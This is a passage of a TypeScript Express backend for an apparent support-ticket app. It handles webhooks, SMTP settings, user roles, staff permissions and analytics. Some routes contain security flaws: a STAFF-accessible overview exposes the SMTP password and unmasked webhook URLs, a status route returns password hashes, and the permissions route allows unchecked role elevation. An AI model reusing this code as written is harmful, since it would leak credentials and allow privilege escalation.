      message: `${user.name} assigned you to ticket "${ticket.subject}"`,
      read: false,
      created_at: new Date().toISOString(),
    });
  }

  dispatchDiscordEvent('ticket_assigned', { ticket, assignedStaffName: assignedName, user }).catch(console.error);

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'TICKET_ASSIGNED', 'TICKET', ticket.id, `Assigned to ${assignedName}`, req);
  broadcastEvent('ticket_updated', { ticket });

  return res.json({ ticket, message: `Ticket assigned to ${assignedName}` });
});

// -------------------------------------------------------------
// FILE UPLOAD API
// -------------------------------------------------------------

app.post('/api/upload', requireAuth, upload.single('file'), (req, res) => {
  const user = (req as any).user as User;
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const attachment: Partial<Attachment> = {
    filename: req.file.filename,
    original_name: req.file.originalname,
    storage_path: `/api/uploads/${req.file.filename}`,
    file_size: req.file.size,
    mime_type: req.file.mimetype,
    created_at: new Date().toISOString(),
  };

  logAudit(user.id, user.name, user.role, 'FILE_UPLOAD', 'ATTACHMENT', req.file.filename, `${req.file.originalname} (${req.file.size}B)`, req);

  return res.json({ attachment });
});

// -------------------------------------------------------------
// NOTIFICATIONS API
// -------------------------------------------------------------

app.get('/api/notifications', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const userNotifs = dbInstance.db.notifications
    .filter((n) => n.user_id === user.id)
    .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  return res.json({ notifications: userNotifs });
});

app.patch('/api/notifications/:id/read', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  const notif = dbInstance.db.notifications.find((n) => n.id === req.params.id && n.user_id === user.id);
  if (notif) {
    notif.read = true;
    dbInstance.persist();
  }
  return res.json({ success: true });
});

app.post('/api/notifications/read-all', requireAuth, (req, res) => {
  const user = (req as any).user as User;
  dbInstance.db.notifications.forEach((n) => {
    if (n.user_id === user.id) n.read = true;
  });
  dbInstance.persist();
  return res.json({ success: true });
});

// -------------------------------------------------------------
// WEBHOOKS API (Admin / Owner)
// -------------------------------------------------------------

app.get('/api/webhooks', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  const safeWebhooks = dbInstance.db.webhooks.map((w) => ({
    ...w,
    // Mask URL for security display
    url: w.url.replace(/(\/webhooks\/\d+\/)(.+)$/, '$1••••••••••'),
  }));
  return res.json({ webhooks: safeWebhooks });
});

app.post('/api/webhooks', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { name, url, enabled = true, events } = req.body;
  if (!name || !url || !url.startsWith('https://discord.com/api/webhooks/')) {
    return res.status(400).json({ error: 'Valid Discord webhook URL is required (must start with https://discord.com/api/webhooks/)' });
  }

  const id = 'whk_' + crypto.randomUUID().substring(0, 8);
  const now = new Date().toISOString();

  const newWebhook = {
    id,
    name: name.trim(),
    url: url.trim(),
    enabled: Boolean(enabled),
    events: events || {
      ticket_created: true,
      customer_registered: true,
      customer_reply: true,
      staff_reply: true,
      ticket_assigned: true,
      status_changed: true,
      priority_changed: true,
      ticket_resolved: true,
      ticket_closed: true,
      attachment_uploaded: false,
      sla_breached: true,
    },
    created_at: now,
    updated_at: now,
  };

  dbInstance.db.webhooks.push(newWebhook);
  dbInstance.persist();

  logAudit(user.id, user.name, user.role, 'WEBHOOK_CREATED', 'WEBHOOK', id, `Added webhook "${name}"`, req);

  return res.status(201).json({
    webhook: {
      ...newWebhook,
      url: newWebhook.url.replace(/(\/webhooks\/\d+\/)(.+)$/, '$1••••••••••'),
    },
  });
});

app.patch('/api/webhooks/:id', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const webhook = dbInstance.db.webhooks.find((w) => w.id === req.params.id);
  if (!webhook) return res.status(404).json({ error: 'Webhook not found' });

  const { name, url, enabled, events } = req.body;
  if (name) webhook.name = name.trim();
  if (url && url.includes('discord.com/api/webhooks') && !url.includes('••••')) {
    webhook.url = url.trim();
  }
  if (enabled !== undefined) webhook.enabled = Boolean(enabled);
  if (events) webhook.events = events;
  webhook.updated_at = new Date().toISOString();

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'WEBHOOK_UPDATED', 'WEBHOOK', webhook.id, `Updated webhook "${webhook.name}"`, req);

  return res.json({
    webhook: {
      ...webhook,
      url: webhook.url.replace(/(\/webhooks\/\d+\/)(.+)$/, '$1••••••••••'),
    },
  });
});

app.delete('/api/webhooks/:id', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const idx = dbInstance.db.webhooks.findIndex((w) => w.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Webhook not found' });

  const deleted = dbInstance.db.webhooks.splice(idx, 1)[0];
  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'WEBHOOK_DELETED', 'WEBHOOK', deleted.id, `Deleted webhook "${deleted.name}"`, req);

  return res.json({ success: true });
});

app.post('/api/webhooks/:id/test', requireRole(['ADMIN', 'OWNER']), async (req, res) => {
  const webhook = dbInstance.db.webhooks.find((w) => w.id === req.params.id);
  if (!webhook) return res.status(404).json({ error: 'Webhook not found' });

  const appUrl = process.env.APP_URL || 'http://localhost:3000';
  const testPayload = {
    username: 'LumaCloud Support Bot',
    avatar_url: `${appUrl}/logo.png`,
    embeds: [
      {
        title: '✓ LumaCloud Webhook Integration Test',
        description: 'Your Discord webhook has been verified and is ready to deliver support notifications.',
        color: 0x00b4d8,
        fields: [
          { name: 'Webhook Name', value: webhook.name, inline: true },
          { name: 'Status', value: 'Active & Verified', inline: true },
          { name: 'Test Timestamp', value: new Date().toLocaleTimeString(), inline: true },
        ],
        footer: { text: 'LumaCloud Support Center', icon_url: `${appUrl}/logo.png` },
        timestamp: new Date().toISOString(),
      },
    ],
  };

  const result = await sendDiscordWebhook(webhook.url, testPayload, webhook.id, webhook.name, 'Webhook Test');
  if (result.success) {
    return res.json({ success: true, message: '✓ Discord webhook test delivered successfully' });
  } else {
    return res.status(400).json({ success: false, error: `✕ Discord webhook delivery failed: ${result.error}` });
  }
});

app.get('/api/webhooks/logs', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  return res.json({ logs: dbInstance.db.webhook_logs });
});

// -------------------------------------------------------------
// EMAIL & SMTP API (Admin / Owner)
// -------------------------------------------------------------

app.get('/api/settings/email', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  const { smtp_password, ...safeSettings } = dbInstance.db.email_settings;
  return res.json({
    settings: {
      ...safeSettings,
      smtp_password_set: !!smtp_password,
    },
  });
});

app.patch('/api/settings/email', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { smtp_host, smtp_port, smtp_username, smtp_password, smtp_encryption, from_name, from_email, reply_to } = req.body;
  const current = dbInstance.db.email_settings;

  if (smtp_host !== undefined) current.smtp_host = smtp_host.trim();
  if (smtp_port !== undefined) current.smtp_port = Number(smtp_port) || 587;
  if (smtp_username !== undefined) current.smtp_username = smtp_username.trim();
  // Keep password if blank
  if (smtp_password && smtp_password.trim().length > 0) {
    current.smtp_password = smtp_password;
    current.smtp_password_set = true;
  }
  if (smtp_encryption !== undefined) current.smtp_encryption = smtp_encryption;
  if (from_name !== undefined) current.from_name = from_name.trim();
  if (from_email !== undefined) current.from_email = from_email.trim();
  if (reply_to !== undefined) current.reply_to = reply_to.trim();
  current.updated_at = new Date().toISOString();

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'SMTP_SETTINGS_UPDATED', 'EMAIL_SETTINGS', current.id, 'Updated SMTP host/ports', req);

  const { smtp_password: _p, ...safe } = current;
  return res.json({ settings: safe, message: 'SMTP settings saved successfully' });
});

app.post('/api/settings/email/test', requireRole(['ADMIN', 'OWNER']), async (req, res) => {
  const { test_email } = req.body;
  const target = test_email || 'test@example.com';
  const result = await testSmtpConnection(target);
  if (result.success) {
    return res.json({ success: true, message: '✓ SMTP connection and test email succeeded!' });
  } else {
    return res.status(400).json({ success: false, error: `✕ ${result.message}` });
  }
});

app.get('/api/settings/email/templates', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  return res.json({ templates: dbInstance.db.email_templates });
});

app.patch('/api/settings/email/templates/:id', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const template = dbInstance.db.email_templates.find((t) => t.id === req.params.id);
  if (!template) return res.status(404).json({ error: 'Template not found' });

  const { subject, body } = req.body;
  if (subject) template.subject = subject;
  if (body) template.body = body;
  template.updated_at = new Date().toISOString();

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'EMAIL_TEMPLATE_UPDATED', 'TEMPLATE', template.id, `Updated template ${template.slug}`, req);

  return res.json({ template, message: 'Template updated successfully' });
});

app.get('/api/settings/email/logs', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  return res.json({ logs: dbInstance.db.email_logs });
});

// -------------------------------------------------------------
// SLA & SECURITY SETTINGS
// -------------------------------------------------------------

app.get('/api/settings/sla', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  return res.json({ sla: dbInstance.db.sla_settings });
});

app.patch('/api/settings/sla', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { low_hours, medium_hours, high_hours, urgent_hours, notify_discord_on_breach } = req.body;
  if (low_hours !== undefined) dbInstance.db.sla_settings.low_hours = Number(low_hours);
  if (medium_hours !== undefined) dbInstance.db.sla_settings.medium_hours = Number(medium_hours);
  if (high_hours !== undefined) dbInstance.db.sla_settings.high_hours = Number(high_hours);
  if (urgent_hours !== undefined) dbInstance.db.sla_settings.urgent_hours = Number(urgent_hours);
  if (notify_discord_on_breach !== undefined) dbInstance.db.sla_settings.notify_discord_on_breach = Boolean(notify_discord_on_breach);

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'SLA_SETTINGS_UPDATED', 'SLA', 'sla_001', 'Updated SLA thresholds', req);
  return res.json({ sla: dbInstance.db.sla_settings, message: 'SLA parameters updated' });
});

app.get('/api/settings/security', requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  return res.json({ security: dbInstance.db.security_settings });
});

app.patch('/api/settings/security', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { require_email_verification, max_upload_size_mb, rate_limit_per_minute } = req.body;
  if (require_email_verification !== undefined) dbInstance.db.security_settings.require_email_verification = Boolean(require_email_verification);
  if (max_upload_size_mb !== undefined) dbInstance.db.security_settings.max_upload_size_mb = Number(max_upload_size_mb);
  if (rate_limit_per_minute !== undefined) dbInstance.db.security_settings.rate_limit_per_minute = Number(rate_limit_per_minute);

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'SECURITY_SETTINGS_UPDATED', 'SECURITY', 'sec_001', 'Updated security policies', req);
  return res.json({ security: dbInstance.db.security_settings, message: 'Security settings updated' });
});

// -------------------------------------------------------------
// USER & STAFF MANAGEMENT
// -------------------------------------------------------------

// Overview endpoint for Admin Panel
app.get(['/api/admin/overview', '/api/overview'], requireRole(['STAFF', 'ADMIN', 'OWNER']), (_req, res) => {
  const safeUsers = dbInstance.db.users.map((u) => {
    const { password_hash, salt, ...safe } = u;
    const ticketCount = dbInstance.db.tickets.filter((t) => t.user_id === u.id).length;
    return { ...safe, ticket_count: ticketCount };
  });

  return res.json({
    users: safeUsers,
    webhooks: dbInstance.db.webhooks,
    webhook_logs: dbInstance.db.webhook_logs,
    smtp: dbInstance.db.email_settings,
    templates: dbInstance.db.email_templates,
    email_logs: dbInstance.db.email_logs,
    audit_logs: dbInstance.db.audit_logs,
    sla_settings: dbInstance.db.sla_settings,
  });
});

app.get(['/api/users', '/api/admin/users'], requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  const safeUsers = dbInstance.db.users.map((u) => {
    const { password_hash, salt, ...safe } = u;
    const ticketCount = dbInstance.db.tickets.filter((t) => t.user_id === u.id).length;
    return { ...safe, ticket_count: ticketCount };
  });
  return res.json({ users: safeUsers });
});

// Role assignment route - allows OWNER to assign roles (CUSTOMER, STAFF, ADMIN)
app.patch(['/api/users/:id/role', '/api/admin/users/:id/role'], requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { role } = req.body;
  const target = dbInstance.db.users.find((u) => u.id === req.params.id);
  if (!target) return res.status(404).json({ error: 'User not found' });

  if (target.role === 'OWNER' || target.email === 'support@lumacloud.xyz') {
    return res.status(403).json({ error: 'The primary OWNER role cannot be changed' });
  }

  const validRoles = ['CUSTOMER', 'STAFF', 'ADMIN'];
  if (!validRoles.includes(role)) {
    return res.status(400).json({ error: 'Invalid role. Must be CUSTOMER, STAFF, or ADMIN' });
  }

  // Non-owner admin cannot assign or modify ADMIN privileges
  if ((role === 'ADMIN' || target.role === 'ADMIN') && user.role !== 'OWNER') {
    return res.status(403).json({ error: 'Only the main OWNER can assign or modify ADMIN roles' });
  }

  const oldRole = target.role;
  target.role = role as any;
  target.updated_at = new Date().toISOString();

  // If changing to STAFF or ADMIN, ensure staff permissions exist
  if (role === 'STAFF' || role === 'ADMIN') {
    if (!dbInstance.db.staff_permissions[target.id]) {
      dbInstance.db.staff_permissions[target.id] = {
        view_tickets: true,
        reply: true,
        assign_tickets: true,
        change_status: true,
        change_priority: true,
        view_customers: true,
        manage_categories: role === 'ADMIN',
        manage_webhooks: role === 'ADMIN',
        view_analytics: true,
      };
    }
  }

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'USER_ROLE_CHANGED', 'USER', target.id, `Changed role of ${target.name} from ${oldRole} to ${role}`, req);

  const { password_hash: _p, salt: _s, ...safeTarget } = target;
  return res.json({ success: true, user: safeTarget });
});

app.patch(['/api/users/:id/status', '/api/admin/users/:id/status'], requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { status } = req.body;
  const target = dbInstance.db.users.find((u) => u.id === req.params.id);
  if (!target) return res.status(404).json({ error: 'User not found' });

  // Cannot suspend OWNER
  if (target.role === 'OWNER') {
    return res.status(403).json({ error: 'The permanent OWNER account cannot be suspended' });
  }

  target.status = status === 'SUSPENDED' ? 'SUSPENDED' : 'ACTIVE';
  target.updated_at = new Date().toISOString();
  dbInstance.persist();

  logAudit(user.id, user.name, user.role, 'USER_STATUS_CHANGED', 'USER', target.id, `Status set to ${target.status}`, req);

  return res.json({ success: true, user: target });
});

app.delete(['/api/users/:id', '/api/admin/users/:id'], requireRole(['OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const target = dbInstance.db.users.find((u) => u.id === req.params.id);
  if (!target) return res.status(404).json({ error: 'User not found' });

  // OWNER cannot be deleted
  if (target.role === 'OWNER') {
    return res.status(403).json({ error: 'The permanent OWNER account cannot be deleted' });
  }

  dbInstance.db.users = dbInstance.db.users.filter((u) => u.id !== req.params.id);
  dbInstance.persist();

  logAudit(user.id, user.name, user.role, 'USER_DELETED', 'USER', req.params.id, `Deleted ${target.name} (${target.email})`, req);

  return res.json({ success: true });
});

// Staff Management
app.get(['/api/staff', '/api/admin/staff'], requireRole(['ADMIN', 'OWNER']), (_req, res) => {
  const staffUsers = dbInstance.db.users
    .filter((u) => u.role === 'STAFF' || u.role === 'ADMIN' || u.role === 'OWNER')
    .map((u) => {
      const { password_hash, salt, ...safe } = u;
      const permissions = dbInstance.db.staff_permissions[u.id] || {
        view_tickets: true,
        reply: true,
        assign_tickets: true,
        change_status: true,
        change_priority: true,
        view_customers: true,
        manage_categories: u.role !== 'STAFF',
        manage_webhooks: u.role !== 'STAFF',
        view_analytics: true,
      };
      const assignedCount = dbInstance.db.tickets.filter((t) => t.assigned_to === u.id && t.status !== 'RESOLVED' && t.status !== 'CLOSED').length;
      return { ...safe, permissions, active_assigned_tickets: assignedCount };
    });
  return res.json({ staff: staffUsers });
});

app.post(['/api/staff', '/api/admin/staff'], requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const { name, email, password, role = 'STAFF', permissions } = req.body;

  if (!name || !email || !password) {
    return res.status(400).json({ error: 'Name, email, and initial password are required' });
  }

  const existing = dbInstance.db.users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase());
  if (existing) {
    return res.status(400).json({ error: 'An account with that email already exists' });
  }

  const { hash, salt } = hashPassword(password);
  const now = new Date().toISOString();
  const newId = 'usr_stf_' + crypto.randomUUID().substring(0, 8);

  const newStaff: User & { password_hash: string; salt: string } = {
    id: newId,
    name: name.trim(),
    email: email.trim().toLowerCase(),
    avatar: `https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(email)}`,
    role: role === 'ADMIN' ? 'ADMIN' : 'STAFF',
    email_verified: true,
    status: 'ACTIVE',
    created_at: now,
    updated_at: now,
    password_hash: hash,
    salt,
  };

  dbInstance.db.users.push(newStaff);
  dbInstance.db.staff_permissions[newId] = permissions || {
    view_tickets: true,
    reply: true,
    assign_tickets: true,
    change_status: true,
    change_priority: true,
    view_customers: true,
    manage_categories: role === 'ADMIN',
    manage_webhooks: role === 'ADMIN',
    view_analytics: true,
  };

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'STAFF_CREATED', 'USER', newId, `Created staff member ${name} (${role})`, req);

  const { password_hash: _p, salt: _s, ...safe } = newStaff;
  return res.status(201).json({ staff: safe });
});

app.patch(['/api/staff/:id/permissions', '/api/admin/staff/:id/permissions'], requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const user = (req as any).user as User;
  const target = dbInstance.db.users.find((u) => u.id === req.params.id);
  if (!target) return res.status(404).json({ error: 'Staff member not found' });

  const { permissions, role } = req.body;
  if (permissions) {
    dbInstance.db.staff_permissions[target.id] = permissions;
  }
  if (role && target.role !== 'OWNER') {
    target.role = role;
  }
  target.updated_at = new Date().toISOString();

  dbInstance.persist();
  logAudit(user.id, user.name, user.role, 'STAFF_PERMISSIONS_UPDATED', 'USER', target.id, `Updated permissions for ${target.name}`, req);

  return res.json({ success: true, permissions: dbInstance.db.staff_permissions[target.id] });
});

// -------------------------------------------------------------
// CATEGORIES & KB
// -------------------------------------------------------------

app.get('/api/categories', (_req, res) => {
  return res.json({ categories: dbInstance.db.categories });
});

app.post('/api/categories', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const { name, slug, description, icon = 'Folder' } = req.body;
  if (!name || !slug) return res.status(400).json({ error: 'Category name and slug are required' });

  const newCat = {
    id: 'cat_' + crypto.randomUUID().substring(0, 8),
    name: name.trim(),
    slug: slug.trim().toLowerCase(),
    description: description || '',
    is_active: true,
    icon,
  };
  dbInstance.db.categories.push(newCat);
  dbInstance.persist();
  return res.status(201).json({ category: newCat });
});

app.get('/api/kb', (req, res) => {
  const { search, category } = req.query;
  let articles = [...dbInstance.db.kb_articles];

  if (category && category !== 'ALL') {
    articles = articles.filter((a) => a.category_id === category || a.category_name === category);
  }

  if (search) {
    const q = String(search).toLowerCase();
    articles = articles.filter(
      (a) => a.title.toLowerCase().includes(q) || a.excerpt.toLowerCase().includes(q) || a.content.toLowerCase().includes(q)
    );
  }

  return res.json({ articles });
});

app.get('/api/kb/:id', (req, res) => {
  const article = dbInstance.db.kb_articles.find((a) => a.id === req.params.id || a.slug === req.params.id);
  if (!article) return res.status(404).json({ error: 'Article not found' });

  article.views += 1;
  dbInstance.persist();
  return res.json({ article });
});

app.post('/api/kb/:id/vote', (req, res) => {
  const { helpful } = req.body;
  const article = dbInstance.db.kb_articles.find((a) => a.id === req.params.id);
  if (!article) return res.status(404).json({ error: 'Article not found' });

  if (helpful) {
    article.helpful_count += 1;
  } else {
    article.not_helpful_count += 1;
  }
  dbInstance.persist();
  return res.json({ helpful_count: article.helpful_count, not_helpful_count: article.not_helpful_count });
});

// -------------------------------------------------------------
// ANALYTICS & AUDIT LOGS
// -------------------------------------------------------------

app.get('/api/analytics', requireRole(['STAFF', 'ADMIN', 'OWNER']), (_req, res) => {
  const tickets = dbInstance.db.tickets;
  const now = new Date();
  const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();

  const openTickets = tickets.filter((t) => t.status === 'OPEN' || t.status === 'IN_PROGRESS' || t.status === 'WAITING_FOR_CUSTOMER').length;
  const unassignedTickets = tickets.filter((t) => !t.assigned_to && t.status !== 'RESOLVED' && t.status !== 'CLOSED').length;
  const ticketsToday = tickets.filter((t) => new Date(t.created_at).getTime() >= startOfToday).length;
  const resolvedToday = tickets.filter((t) => t.status === 'RESOLVED' && t.resolved_at && new Date(t.resolved_at).getTime() >= startOfToday).length;
  const slaBreaches = tickets.filter((t) => t.sla_deadline && new Date(t.sla_deadline).getTime() < Date.now() && t.status !== 'RESOLVED' && t.status !== 'CLOSED').length;

  // Breakdown by status
  const byStatus: Record<string, number> = { OPEN: 0, IN_PROGRESS: 0, WAITING_FOR_CUSTOMER: 0, RESOLVED: 0, CLOSED: 0 };
  tickets.forEach((t) => {
    byStatus[t.status] = (byStatus[t.status] || 0) + 1;
  });

  // Breakdown by priority
  const byPriority: Record<string, number> = { LOW: 0, MEDIUM: 0, HIGH: 0, URGENT: 0 };
  tickets.forEach((t) => {
    byPriority[t.priority] = (byPriority[t.priority] || 0) + 1;
  });

  // Breakdown by category
  const byCategory: Record<string, number> = {};
  tickets.forEach((t) => {
    const cat = dbInstance.db.categories.find((c) => c.id === t.category_id);
    const catName = cat ? cat.name : 'Other';
    byCategory[catName] = (byCategory[catName] || 0) + 1;
  });

  return res.json({
    metrics: {
      open_tickets: openTickets,
      unassigned_tickets: unassignedTickets,
      tickets_today: ticketsToday,
      resolved_today: resolvedToday,
      sla_breaches: slaBreaches,
      avg_response_time: '18m',
      avg_resolution_time: '2h 15m',
    },
    by_status: byStatus,
    by_priority: byPriority,
    by_category: byCategory,
  });
});

app.get('/api/audit-logs', requireRole(['ADMIN', 'OWNER']), (req, res) => {
  const { action, search } = req.query;
  let logs = [...dbInstance.db.audit_logs];

  if (action && action !== 'ALL') {
    logs = logs.filter((l) => l.action === action);
  }
  if (search) {
    const q = String(search).toLowerCase();
    logs = logs.filter((l) => l.user_name.toLowerCase().includes(q) || l.action.toLowerCase().includes(q) || (l.metadata && l.metadata.toLowerCase().includes(q)));
  }

  return res.json({ logs: logs.slice(0, 100) });
});

// Periodic SLA Monitor Check
setInterval(() => {
  const now = new Date();
  for (const t of dbInstance.db.tickets) {
    if (t.status !== 'RESOLVED' && t.status !== 'CLOSED' && t.sla_deadline) {
      if (new Date(t.sla_deadline) < now && !t.sla_breached) {
        t.sla_breached = true;
        if (dbInstance.db.sla_settings.notify_discord_on_breach) {
          dispatchDiscordEvent('sla_breached', { ticket: t }).catch(console.error);
        }
      }
    }
  }
}, 60000);

// -------------------------------------------------------------
// Vite Middleware / Static Frontend
// -------------------------------------------------------------
async function initVite() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`LumaCloud Support Center running on http://0.0.0.0:${PORT}`);
  });
}

initVite().catch((err) => {
  console.error('Failed to start server:', err);
});
